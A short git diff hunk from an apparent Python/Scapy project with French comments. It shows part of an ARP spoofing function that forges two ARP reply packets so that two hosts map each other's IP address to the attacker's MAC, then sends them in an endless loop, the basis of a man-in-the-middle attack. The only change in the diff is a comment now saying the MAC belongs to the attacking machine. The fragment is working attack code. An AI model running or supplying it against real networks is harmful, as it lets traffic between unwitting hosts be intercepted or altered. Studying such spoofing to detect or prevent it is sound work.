@@ -23,7 +23,7 @@ def arp(ipa:str, ipb:str)->None:
 
   maclist = [mac(ip) for ip in [ipa, ipb]]
 
-  #On cree deux paquets ARP qui associe l'adresse IP (a et b) a l'adresse MAC du PC
+  #On cree deux paquets ARP qui associe l'adresse IP (a et b) a l'adresse MAC du PC sur lequel on réalise l'attaque
   paquet1 = Ether(dst=maclist[0])/ARP(op=2, pdst=ipa, psrc=ipb)
   paquet2 = Ether(dst=maclist[1])/ARP(op=2, pdst=ipb, psrc=ipa)
   while True: #Boucle infinie
